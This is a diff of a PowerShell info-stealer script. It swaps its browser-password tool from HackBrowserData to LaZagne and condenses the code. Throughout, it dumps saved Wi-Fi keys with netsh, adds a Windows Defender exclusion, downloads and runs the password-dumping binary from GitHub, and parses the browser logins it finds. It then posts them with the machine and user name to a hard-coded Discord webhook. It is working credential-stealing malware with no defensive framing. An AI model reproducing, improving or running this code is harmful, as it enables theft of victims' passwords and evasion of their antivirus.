@@ -5,171 +5,63 @@ $webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAO
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
 
 # === WiFi Passwords ===
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
 $wifi = ""
-foreach($name in $wifiProfiles) {
-    $profileInfo = netsh wlan show profile name="$name" key=clear
-    $passLine = $profileInfo | Select-String "Key Content\W+\:(.+)$"
+$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+foreach($name in $profiles) {
+    $passLine = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$"
     if($passLine) {
-        $pass = $passLine.Matches.Groups[1].Value.Trim()
-        $wifi += "$name : $pass`n"
+        $wifi += "$name : $($passLine.Matches.Groups[1].Value.Trim())`n"
     }
 }
 if(-not $wifi) { $wifi = "No WiFi networks found" }
 
 # === Browser Passwords ===
-$tempDir = "$env:TEMP\hbd_$(Get-Random)"
+$tempDir = "$env:TEMP\$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 
 try {
-    # Add temp directory to Windows Defender exclusion
-    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
-    
-    # Download HackBrowserData
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-    $zipPath = "$tempDir\hbd.zip"
-    
+    # Download LaZagne
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
+    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$tempDir\lz.exe" -UseBasicParsing
     
-    # Extract
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
+    # Run LaZagne
+    $result = & "$tempDir\lz.exe" browsers 2>&1 | Out-String
     
-    # Run HackBrowserData
-    $exePath = "$tempDir\hack-browser-data.exe"
-    if(Test-Path $exePath) {
-        $browsers = "Debug Info:`n"
-        
-        # Search for browser data directories
-        $localAppData = $env:LOCALAPPDATA
-        $appData = $env:APPDATA
-        
-        # Check all User Data folders
-        $edgePaths = @(
-            "$localAppData\Microsoft\Edge\User Data"
-            "$localAppData\Microsoft\Edge SxS\User Data"
-        )
-        
-        $chromePaths = @(
-            "$localAppData\Google\Chrome\User Data"
-            "$localAppData\Chromium\User Data"
-        )
-        
-        $operaPaths = @(
-            "$appData\Opera Software\Opera Stable"
-            "$appData\Opera Software\Opera GX Stable"
-        )
-        
-        $browsers += "Searching for browsers...`n"
-        
-        # Find Edge profiles
-        foreach($basePath in $edgePaths) {
-            if(Test-Path $basePath) {
-                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
-                foreach($profile in $profiles) {
-                    $browsers += "Found Edge: " + $profile.FullName + "`n"
-                    & $exePath -b edge -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
-                }
+    # Parse passwords
+    $browsers = ""
+    $lines = $result -split "`n"
+    $url = $user = ""
+    
+    foreach($line in $lines) {
+        if($line -match "URL: (.+)") { $url = $matches[1].Trim() }
+        elseif($line -match "Login: (.+)") { $user = $matches[1].Trim() }
+        elseif($line -match "Password: (.+)") {
+            $pass = $matches[1].Trim()
+            if($pass -notmatch "^b'") {
+                $browsers += "$url`nUser: $user`nPass: $pass`n`n"
             }
         }
-        
-        # Find Chrome profiles
-        foreach($basePath in $chromePaths) {
-            if(Test-Path $basePath) {
-                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
-                foreach($profile in $profiles) {
-                    $browsers += "Found Chrome: " + $profile.FullName + "`n"
-                    & $exePath -b chrome -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
-                }
-            }
-        }
-        
-        # Find Opera profiles
-        foreach($operaPath in $operaPaths) {
-            if(Test-Path $operaPath) {
-                $browsers += "Found Opera: " + $operaPath + "`n"
-                & $exePath -b opera -p $operaPath -f json --dir $tempDir 2>&1 | Out-Null
-            }
-        }
-        
-        Start-Sleep -Seconds 5
-        
-        # List all files created
-        $allFiles = Get-ChildItem -Path $tempDir -Filter "*.json"
-        $browsers += "JSON files found: " + $allFiles.Count + "`n"
-        foreach($f in $allFiles) {
-            $browsers += "  - " + $f.Name + " (" + $f.Length + " bytes)`n"
-        }
-        
-        # Read ALL password JSON files and combine
-        $jsonFiles = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse
-        $browsers += "Password files to read: " + $jsonFiles.Count + "`n"
-        $passData = ""
-        
-        foreach($jsonFile in $jsonFiles) {
-            try {
-                $browsers += "Reading: " + $jsonFile.Name + "`n"
-                $content = Get-Content $jsonFile.FullName -Raw
-                
-                if($content.Length -gt 10) {
-                    $data = $content | ConvertFrom-Json
-                    $browsers += "  Entries: " + $data.Count + "`n"
-                    
-                    foreach($item in $data) {
-                        $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
-                        $user = if($item.UserName) { $item.UserName } else { "" }
-                        $pass = if($item.Password) { $item.Password } else { "" }
-                        
-                        if($pass -and $pass.Length -gt 0) {
-                            $passData += "$url`nUser: $user`nPass: $pass`n`n"
-                        }
-                    }
-                } else {
-                    $browsers += "  File too small, skipping`n"
-                }
-            } catch {
-                $browsers += "  Error: " + $_.Exception.Message + "`n"
-            }
-        }
-        
-        if($passData) {
-            $browsers = $passData
-        } else {
-            $browsers += "`nNo passwords extracted from JSON files"
-        }
-    } else {
-        $browsers = "Failed to extract HackBrowserData"
     }
+    
+    if(-not $browsers) { $browsers = "No passwords found (Windows 11 not supported)" }
 } catch {
     $browsers = "Error: $($_.Exception.Message)"
 }
 
-# Clean up
+# Cleanup
 Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
-# === Format and Send ===
-$output = @"
-**PC: $pc**
+# Send to Discord
+$output = "**PC: $pc**`n`n**WiFi:**`n$wifi`n**Browsers:**`n$browsers"
 
-**=== WiFi Networks ===**
-$wifi
-
-**=== Browser Passwords ===**
-$browsers
-"@
-
-# Split into chunks if too long (Discord has 2000 char limit)
-$maxLen = 1900
-if($output.Length -gt $maxLen) {
-    for($i = 0; $i -lt $output.Length; $i += $maxLen) {
-        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
-        $body = @{ content = $chunk } | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+if($output.Length -gt 1900) {
+    for($i = 0; $i -lt $output.Length; $i += 1900) {
+        $chunk = $output.Substring($i, [Math]::Min(1900, $output.Length - $i))
+        Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$chunk} | ConvertTo-Json) -ContentType 'application/json'
         Start-Sleep -Milliseconds 500
     }
 } else {
-    $body = @{ content = $output } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+    Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$output} | ConvertTo-Json) -ContentType 'application/json'
 }
